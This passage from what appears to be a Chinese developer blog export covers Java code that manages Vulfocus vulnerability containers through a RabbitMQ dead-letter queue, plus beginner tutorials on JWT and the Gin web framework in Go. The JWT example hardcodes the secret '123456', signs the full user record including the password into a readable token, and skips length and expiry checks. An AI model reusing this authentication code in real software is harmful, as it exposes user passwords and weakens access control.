        countdown = SystemConstants.DOCKER_CONTAINER_TIME;
        taskEndDate = taskStartDate.plusSeconds(countdown);
    &#125;
    <span class="hljs-keyword">assert</span> container != <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (container.getState().equals(<span class="hljs-string">&quot;running&quot;</span>)) &#123;
        HashMap&lt;String, Object&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        data.put(<span class="hljs-string">&quot;host&quot;</span>, vulHost);
        data.put(<span class="hljs-string">&quot;port&quot;</span>, vulPort);
        data.put(<span class="hljs-string">&quot;id&quot;</span>, containerId);
        data.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;running&quot;</span>);
        data.put(<span class="hljs-string">&quot;start_data&quot;</span>, taskStartDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli());
        data.put(<span class="hljs-string">&quot;end_data&quot;</span>, taskEndDate != <span class="hljs-literal">null</span> ? taskEndDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli() : <span class="hljs-number">0</span>);
        LambdaQueryWrapper&lt;TaskInfo&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getUserId, userId);
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskMsg, JSON.toJSONString(data));
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getOperationType, <span class="hljs-number">2</span>);
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getOperationArgs, JSON.toJSONString(args));
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskEndDate, taskEndDate);
        wrapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskName, <span class="hljs-string">&quot;运行容器：&quot;</span> + imageName);
        <span class="hljs-type">TaskInfo</span> <span class="hljs-variable">searchTaskInfo</span> <span class="hljs-operator">=</span> getOne(wrapper);
        <span class="hljs-keyword">if</span> (searchTaskInfo == <span class="hljs-literal">null</span>) &#123;
            taskInfo.setTaskId(taskId);
            taskInfo.setTaskStatus(<span class="hljs-number">3</span>);
            taskInfo.setTaskMsg(JSON.toJSONString(data));
            taskInfo.setOperationArgs(JSON.toJSONString(args));
            taskInfo.setUpdateDate(LocalDateTime.now());
            taskId = taskInfo.getTaskId();
            LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
            updateWrapperTask.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskId, taskId);
            update(taskInfo, updateWrapperTask);
        &#125; <span class="hljs-keyword">else</span> &#123;
            LambdaQueryWrapper&lt;TaskInfo&gt; removeWapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
            removeWapper.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskId, taskId);
            remove(removeWapper);
            searchTaskInfo.setTaskId(taskId);
            searchTaskInfo.setUpdateDate(LocalDateTime.now());
            searchTaskInfo.setTaskStatus(<span class="hljs-number">3</span>);
            save(searchTaskInfo);
        &#125;

    &#125; <span class="hljs-keyword">else</span> &#123;
        DockerTools.startContainer(dockerContainerId);
        <span class="hljs-comment">// 写入flag</span>
        msg = dockerContainerRun(container, command);
        <span class="hljs-keyword">if</span> (msg != <span class="hljs-literal">null</span> &amp;&amp; msg.getStatus() == SystemConstants.HTTP_ERROR) &#123;
            <span class="hljs-keyword">try</span> &#123;
                DockerTools.deleteContainer(container.getId());
            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;
                log.info(<span class="hljs-string">&quot;删除容器失败！&quot;</span>);
            &#125;
            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
        &#125; <span class="hljs-keyword">else</span> &#123;
            HashMap&lt;String, Object&gt; data = (HashMap&lt;String, Object&gt;) msg.getData();
            <span class="hljs-type">String</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> (String) data.get(<span class="hljs-string">&quot;status&quot;</span>);
            data.put(<span class="hljs-string">&quot;host&quot;</span>, vulHost);
            data.put(<span class="hljs-string">&quot;port&quot;</span>, vulPort);
            data.put(<span class="hljs-string">&quot;id&quot;</span>, containerId);
            data.put(<span class="hljs-string">&quot;start_data&quot;</span>, taskStartDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli());
            data.put(<span class="hljs-string">&quot;end_data&quot;</span>, taskEndDate != <span class="hljs-literal">null</span> ? taskEndDate.toInstant(ZoneOffset.ofHours(<span class="hljs-number">8</span>)).toEpochMilli() : <span class="hljs-number">0</span>);

            containerVul.setContainerStatus(status);
            containerVul.setDockerContainerId(dockerContainerId);
            containerVul.setVulHost(vulHost);
            containerVul.setVulPort(vulPort);
            containerVul.setContainerFlag(vulFlag);
            containerVul.setContainerPort(containerPort);
            containerVul.setCreateDate(LocalDateTime.now());
            containerVul.setUserId(userId);
            containerVul.setIScheck(<span class="hljs-literal">false</span>);
            LambdaQueryWrapper&lt;ContainerVul&gt; updateWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
            updateWrapper.eq(<span class="hljs-literal">true</span>, ContainerVul::getContainerId, containerVul.getContainerId());
            containerService.update(containerVul, updateWrapper);

            taskInfo.setTaskStartDate(LocalDateTime.now());
            taskInfo.setTaskEndDate(LocalDateTime.now());
            taskInfo.setTaskStatus(<span class="hljs-number">3</span>);
        &#125;

        taskInfo.setTaskMsg(JSON.toJSONString(msg));
        taskInfo.setUpdateDate(LocalDateTime.now());

        LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        updateWrapperTask.eq(<span class="hljs-literal">true</span>, TaskInfo::getTaskId, taskId);
        update(taskInfo, updateWrapperTask);
    &#125;
    log.info(<span class="hljs-string">&quot;启动漏洞容器成功，任务ID：&quot;</span> + taskId);
    <span class="hljs-comment">// 创建关闭容器任务 半小时后关闭</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">stopContainerTaskId</span> <span class="hljs-operator">=</span> createStopContainerTask(containerVul, user);
    <span class="hljs-comment">// 发送到RabbitMQ的死信队列</span>
    log.info(<span class="hljs-string">&quot;向死信队列发送任务id&quot;</span>);
    amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
                                RabbitConstants.DLX_ROUTING_KEY,
                                stopContainerTaskId);
&#125;</code></pre>

<p>重点代码就是，就很简单。</p>
<pre><code class="hljs java"><span class="hljs-comment">// 发送到RabbitMQ的死信队列</span>
log.info(<span class="hljs-string">&quot;向死信队列发送任务id&quot;</span>);
amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
                            RabbitConstants.DLX_ROUTING_KEY,
                            stopContainerTaskId);</code></pre>

<h3 id="3-2-关闭容器"><a href="#3-2-关闭容器" class="headerlink" title="3.2 关闭容器"></a>3.2 关闭容器</h3><p>在consumer的监听器中执行关闭容器的步骤</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
<span class="hljs-keyword">import</span> com.sunzy.vulfocus.common.RabbitConstants;
<span class="hljs-keyword">import</span> com.sunzy.vulfocus.service.impl.TaskInfoServiceImpl;
<span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;
<span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Lazy;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.annotation.Resource;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StopContainerListener</span> &#123;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-meta">@Lazy</span> <span class="hljs-comment">// 加这个注释，是因为在启动时，出现了Bean循环依赖的错误</span>
    <span class="hljs-keyword">private</span> TaskInfoServiceImpl taskInfoService;

    <span class="hljs-meta">@RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getMessage</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        System.out.println(<span class="hljs-string">&quot;接收死信队列传递的消息...&quot;</span>);
        System.out.println(<span class="hljs-string">&quot;时间：&quot;</span> + LocalDateTime.now());
        <span class="hljs-type">String</span> <span class="hljs-variable">taskId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());
        System.out.println(taskId);
        <span class="hljs-comment">//</span>
        taskInfoService.stopContainer(taskId);
        channel.basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>);
    &#125;
&#125;
</code></pre>

<p>一开始启动时出现报错，类似如下信息，增加<code>@Lazy</code>解决Bean循环依赖的错误</p>
<pre><code class="hljs java">org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name <span class="hljs-string">&#x27;AService&#x27;</span>: Bean with name <span class="hljs-string">&#x27;AService&#x27;</span> has been injected into other beans [BService] in its raw version as part of a circular reference, but has eventually been wrapped. This means that said other beans <span class="hljs-keyword">do</span> not use the <span class="hljs-keyword">final</span> version of the bean. This is often the result of over-eager type matching - consider using <span class="hljs-string">&#x27;getBeanNamesForType&#x27;</span> with the <span class="hljs-string">&#x27;allowEagerInit&#x27;</span> flag turned off, <span class="hljs-keyword">for</span> example.</code></pre>

<p>完整代码在<a href="https://github.com/sunzhengyu99/vulfocus">vulfocus_java</a></p>
]]></content>
      <tags>
        <tag>springboot, rabbitmq</tag>
      </tags>
  </entry>
  <entry>
    <title>gin_jwt</title>
    <url>/2023/02/04/gin-jwt/</url>
    <content><![CDATA[<h1 id="1-jwt"><a href="#1-jwt" class="headerlink" title="1.jwt"></a>1.jwt</h1><blockquote>
<p>JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案 </p>
<p><a href="https://jwt.io/">jwt官网</a></p>
</blockquote>
<h2 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h2><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。这样服务器就不用保存session，实现无状态认证，可扩展性更强</p>
<h2 id="1-2-数据结构"><a href="#1-2-数据结构" class="headerlink" title="1.2 数据结构"></a>1.2 数据结构</h2><p>JWT主要分为三个部分</p>
<blockquote>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230204214410681.png" alt="image-20230204214410681"></p>
<p>可以看出来jwt的组成也十分简单明了</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header中alg(algorithm)决定了签名使用的加密算法，默认为HS256，也可以根据需要修改加密算法(官网提供了多种加密算法)，typ属性表示这个令牌token的类型（type），JWT 令牌统一写为<code>JWT</code>。</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>payload就是要传递的数据，也是一个json对象，JWT 规定了7个官方字段，供选用。</p>
<pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">iss</span> <span class="hljs-params">(issuer)</span>：签发人</span>
<span class="hljs-function"><span class="hljs-title">exp</span> <span class="hljs-params">(expiration time)</span>：过期时间</span>
<span class="hljs-function"><span class="hljs-title">sub</span> <span class="hljs-params">(subject)</span>：主题</span>
<span class="hljs-function"><span class="hljs-title">aud</span> <span class="hljs-params">(audience)</span>：受众</span>
<span class="hljs-function"><span class="hljs-title">nbf</span> <span class="hljs-params">(Not Before)</span>：生效时间</span>
<span class="hljs-function"><span class="hljs-title">iat</span> <span class="hljs-params">(Issued At)</span>：签发时间</span>
<span class="hljs-function"><span class="hljs-title">jti</span> <span class="hljs-params">(JWT ID)</span>：编号</span></code></pre>

<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
<pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>
  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1516239022</span>
<span class="hljs-punctuation">&#125;</span></code></pre>

<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>Signature 部分是对前两部分的签名，防止数据篡改。</p>
<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">HMACSHA256</span>(
  <span class="hljs-title function_">base64UrlEncode</span>(header) + <span class="hljs-string">&quot;.&quot;</span> +
  <span class="hljs-title function_">base64UrlEncode</span>(payload),
  secret)</code></pre>

<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（<code>.</code>）分隔，就可以返回给用户。</p>
<h2 id="1-3-go实现jwt"><a href="#1-3-go实现jwt" class="headerlink" title="1.3 go实现jwt"></a>1.3 go实现jwt</h2><pre><code class="hljs go"><span class="hljs-keyword">package</span> jwt

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">&quot;crypto/hmac&quot;</span>
	<span class="hljs-string">&quot;crypto/sha256&quot;</span>
	<span class="hljs-string">&quot;encoding/base64&quot;</span>
	<span class="hljs-string">&quot;encoding/json&quot;</span>
	<span class="hljs-string">&quot;errors&quot;</span>
	<span class="hljs-string">&quot;fmt&quot;</span>
	<span class="hljs-string">&quot;strings&quot;</span>
)

<span class="hljs-keyword">type</span> header <span class="hljs-keyword">struct</span> &#123;
	Alg <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;alg&quot;`</span>
	Typ <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;typ&quot;`</span>
&#125;

<span class="hljs-keyword">const</span> (
	HS256 = <span class="hljs-string">&quot;HS256&quot;</span>
)

<span class="hljs-keyword">var</span> alg = HS256
<span class="hljs-keyword">var</span> Secret <span class="hljs-type">string</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hs256</span><span class="hljs-params">(secret, data []<span class="hljs-type">byte</span>)</span></span> (ret <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;
	hasher := hmac.New(sha256.New, secret)
	_, err = hasher.Write(data)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err
	&#125;
	r := hasher.Sum(<span class="hljs-literal">nil</span>)
	<span class="hljs-keyword">return</span> base64.RawURLEncoding.EncodeToString(r), <span class="hljs-literal">nil</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sign</span><span class="hljs-params">(payload <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (ret <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;
	h := header&#123;
		Alg: alg,
		Typ: <span class="hljs-string">&quot;JWT&quot;</span>,
	&#125;
	marshal, err := json.Marshal(h)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err
	&#125;
	bh := base64.RawURLEncoding.EncodeToString(marshal)

	marshal, err = json.Marshal(payload)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err
	&#125;

	bp := base64.RawURLEncoding.EncodeToString(marshal)
	<span class="hljs-comment">// 将header和payload 拼接在一起</span>
	s := fmt.Sprintf(<span class="hljs-string">&quot;%s.%s&quot;</span>, bh, bp)

	ret, err = hs256([]<span class="hljs-type">byte</span>(Secret), []<span class="hljs-type">byte</span>(s))
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err
	&#125;

	<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%s.%s.%s&quot;</span>, bh, bp, ret), <span class="hljs-literal">nil</span>

&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Verify</span><span class="hljs-params">(token <span class="hljs-type">string</span>)</span></span> (err <span class="hljs-type">error</span>) &#123;
	parts := strings.Split(token, <span class="hljs-string">&quot;.&quot;</span>)
	data := strings.Join(parts[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], <span class="hljs-string">&quot;.&quot;</span>)
	hasher := hmac.New(sha256.New, []<span class="hljs-type">byte</span>(Secret))
	_, err = hasher.Write([]<span class="hljs-type">byte</span>(data))
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> err
	&#125;
	sig, err := base64.RawURLEncoding.DecodeString(parts[<span class="hljs-number">2</span>])
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-keyword">return</span> err
	&#125;
	<span class="hljs-keyword">if</span> hmac.Equal(sig, hasher.Sum(<span class="hljs-literal">nil</span>)) &#123;
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	&#125;
	<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;verify is invalid&quot;</span>)
&#125;
</code></pre>



<h1 id="2-gin框架实现jwt身份认证"><a href="#2-gin框架实现jwt身份认证" class="headerlink" title="2.gin框架实现jwt身份认证"></a>2.gin框架实现jwt身份认证</h1><pre><code class="hljs GO"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">&quot;fmt&quot;</span>
	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>
	<span class="hljs-string">&quot;gorm.io/gorm&quot;</span>
	<span class="hljs-string">&quot;gotoken/db&quot;</span>
	<span class="hljs-string">&quot;gotoken/jwt&quot;</span>
	<span class="hljs-string">&quot;net/http&quot;</span>
)

<span class="hljs-keyword">type</span> AccountToken <span class="hljs-keyword">struct</span> &#123;
	Name <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;name&quot;`</span>
&#125;

<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span>&#123;
	gorm.Model
	Username <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;username&quot;`</span>
	Password <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot;`</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;

	db := db.GetDatabase()
	user := User&#123;&#125;

	<span class="hljs-comment">//fmt.Println(user)</span>
	jwt.Secret = <span class="hljs-string">&quot;123456&quot;</span>

	r := gin.Default()
	<span class="hljs-comment">// 中间件 相当于拦截器进行鉴权处理</span>
	r.Use(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;
		<span class="hljs-keyword">if</span> c.Request.RequestURI == <span class="hljs-string">&quot;/login&quot;</span> &#123;
			<span class="hljs-comment">// 如果访问的是login则放行，从而获取token</span>
			<span class="hljs-keyword">return</span>
		&#125;
		token, ok := c.Request.Header[<span class="hljs-string">&quot;Token&quot;</span>]
		fmt.Println(token)
		<span class="hljs-keyword">if</span> ok &#123;
			err := jwt.Verify(token[<span class="hljs-number">0</span>])
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
				c.AbortWithStatusJSON(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Forbidden1&quot;</span>) <span class="hljs-comment">//jwt toke验证不通过 不放行</span>
			&#125;
		&#125; <span class="hljs-keyword">else</span> &#123;
			c.AbortWithStatusJSON(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Forbidden2&quot;</span>)
		&#125;
	&#125;)

	<span class="hljs-comment">// 第一次访问该路由获取token</span>
	r.POST(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;
		userNew := User&#123;&#125;
		c.ShouldBind(&amp;userNew)
		<span class="hljs-keyword">if</span> userNew.Username == <span class="hljs-string">&quot;&quot;</span> || userNew.Password == <span class="hljs-string">&quot;&quot;</span> &#123;
			c.JSON(http.StatusForbidden, gin.H&#123;
				<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;username or password is empty&quot;</span>,
			&#125;)
			<span class="hljs-keyword">return</span>
		&#125;
		db.First(&amp;user, <span class="hljs-string">&quot;username = ?&quot;</span>, userNew.Username)
		<span class="hljs-keyword">if</span> user.Username == userNew.Username &amp;&amp; user.Password == userNew.Password &#123;
			sign, _ := jwt.Sign(user)

			c.JSON(http.StatusOK, gin.H&#123;
				<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;login successfully!&quot;</span>,
				<span class="hljs-string">&quot;data&quot;</span>: sign,
			&#125;)
		&#125; <span class="hljs-keyword">else</span> &#123;
			c.JSON(http.StatusForbidden, gin.H&#123;
				<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;username or password is invalid&quot;</span>,
			&#125;)
			<span class="hljs-keyword">return</span>
		&#125;

	&#125;)
	<span class="hljs-comment">// 访问此路由不需要token</span>
	r.GET(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;
		c.JSON(http.StatusOK, <span class="hljs-string">&quot;index&quot;</span>)
	&#125;)

	r.Run(<span class="hljs-string">&quot;:8081&quot;</span>)
&#125;
</code></pre>

<p>数据库初始化文件</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> db

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">&quot;gorm.io/driver/mysql&quot;</span>
	<span class="hljs-string">&quot;gorm.io/gorm&quot;</span>
)

<span class="hljs-keyword">var</span> Db  *gorm.DB

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;
	<span class="hljs-comment">// 初始化数据库</span>
	dsn := <span class="hljs-string">&quot;root:root@tcp(127.0.0.1:3306)/demo?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span>
	db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)

	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		<span class="hljs-built_in">panic</span>(err)
	&#125;
	Db = db
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetDatabase</span><span class="hljs-params">()</span></span> *gorm.DB&#123;
	<span class="hljs-keyword">return</span> Db
&#125;
</code></pre>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>gin, jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>gin</title>
    <url>/2022/12/08/gin/</url>
    <content><![CDATA[<p>Gin 是一个 Go(Golang) 编写的轻量级 http web 架，运行速度非常快。<br>感觉学完javaweb后在学goweb上手就很快，很多东西原理上是一样的，只是实现方式有所改变</p>
<h1 id="安装gin"><a href="#安装gin" class="headerlink" title="安装gin"></a>安装gin</h1><p>安装失败时配置go环境</p>
<pre><code class="hljs routeros">go env -w <span class="hljs-attribute">GO111MODULE</span>=on
go env -w <span class="hljs-attribute">GOPROXY</span>=https://goproxy.io,direct</code></pre>

<p>安装gin</p>
<pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> -<span class="hljs-keyword">u</span> -v github.<span class="hljs-keyword">com</span>/gin-gonic/gin</code></pre>

<h2 id="创建gin项目"><a href="#创建gin项目" class="headerlink" title="创建gin项目"></a>创建gin项目</h2><p>goland创建时，直接选择go modules即可，否则后面导包可能会出错</p>
<h2 id="启动gin"><a href="#启动gin" class="headerlink" title="启动gin"></a>启动gin</h2><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>
   )  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  
   <span class="hljs-comment">// 创建一个默认路由  </span>
   r := gin.Default()  
   <span class="hljs-comment">// 新建一个路由  </span>
   r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.String(http.StatusOK, <span class="hljs-string">&quot;搭建完成&quot;</span>)  
   &#125;)  
   r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.String(http.StatusOK, <span class="hljs-string">&quot;hello,gin&quot;</span>)  
   &#125;)  
   <span class="hljs-comment">// 启动web服务 默认在8080端口运行  </span>
   r.Run(<span class="hljs-string">&quot;:8888&quot;</span>) <span class="hljs-comment">// 端口号8888  </span>
&#125;</code></pre>

<h1 id="安装fresh"><a href="#安装fresh" class="headerlink" title="安装fresh"></a>安装fresh</h1><p>gin项目热加载<br>安装fresh</p>
<pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/pilu/fresh</code></pre>

<p>在项目目录下运行fresh即可</p>
<h2 id="gin返回json数据"><a href="#gin返回json数据" class="headerlink" title="gin返回json数据"></a>gin返回json数据</h2><p>使用map</p>
<pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/success&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   c.JSON(http.StatusOK,<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] <span class="hljs-keyword">interface</span>&#123;&#125;&#123;  
      <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">200</span>,  
      <span class="hljs-string">&quot;msg&quot;</span> : <span class="hljs-string">&quot;success&quot;</span>,  
      <span class="hljs-string">&quot;data&quot;</span> : <span class="hljs-string">&quot;nil&quot;</span>,  
   &#125;)  
&#125;)</code></pre>

<p>使用gin.H</p>
<pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/success2&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   c.JSON(http.StatusOK,gin.H&#123;  
      <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">200</span>,  
      <span class="hljs-string">&quot;msg&quot;</span> : <span class="hljs-string">&quot;success&quot;</span>,  
      <span class="hljs-string">&quot;data&quot;</span> : <span class="hljs-string">&quot;gin H类型&quot;</span>,  
   &#125;)  
&#125;)</code></pre>

<p>返回结构体类型</p>
<pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/success3&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   article := Article&#123;  
      Tiltle: <span class="hljs-string">&quot;test1&quot;</span>,  
      Desc:   <span class="hljs-string">&quot;hahah&quot;</span>,  
      Author: <span class="hljs-string">&quot;sunzy&quot;</span>,  
   &#125;  
   c.JSON(http.StatusOK,article)  
&#125;)</code></pre>

<h2 id="响应jsonp请求"><a href="#响应jsonp请求" class="headerlink" title="响应jsonp请求"></a>响应jsonp请求</h2><pre><code class="hljs go"><span class="hljs-comment">// jsonp能将回调函数的内容返回  </span>
<span class="hljs-comment">// http://127.0.0.1:8888/jsonp?callback=1111</span>
r.GET(<span class="hljs-string">&quot;/jsonp&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   article := Article&#123;  
      Tiltle: <span class="hljs-string">&quot;test1&quot;</span>,  
      Desc:   <span class="hljs-string">&quot;hahah&quot;</span>,  
      Author: <span class="hljs-string">&quot;sunzy&quot;</span>,  
   &#125;  
   c.JSONP(http.StatusOK,article)  
&#125;)</code></pre>

<p>![[Pasted image 20221207170728.png]]</p>
<h2 id="渲染模板"><a href="#渲染模板" class="headerlink" title="渲染模板"></a>渲染模板</h2><p>首先创建文件夹保存html文件<br>路由加载所有的html</p>
<pre><code class="hljs go"><span class="hljs-comment">// 路由加载模板</span>
r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)  
<span class="hljs-comment">//渲染模板  </span>
